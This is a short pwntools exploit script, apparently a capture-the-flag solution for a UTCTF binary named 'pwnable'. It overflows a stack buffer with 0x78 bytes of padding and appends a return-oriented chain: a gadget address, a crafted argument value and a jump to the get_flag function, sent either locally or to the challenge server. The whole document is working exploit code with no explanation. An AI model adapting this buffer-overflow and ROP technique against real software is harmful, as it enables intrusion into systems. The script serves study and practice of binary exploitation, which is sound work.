from pwn import *

e = ELF("./pwnable")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("binary.utctf.live", 9002)
else:
  p = process(e.path)

p.sendlineafter("!", "A" * 0x78 + p64(0x400693) + p64(0x100**4 - 0x21524111) + p64(e.symbols["get_flag"]))

p.interactive()
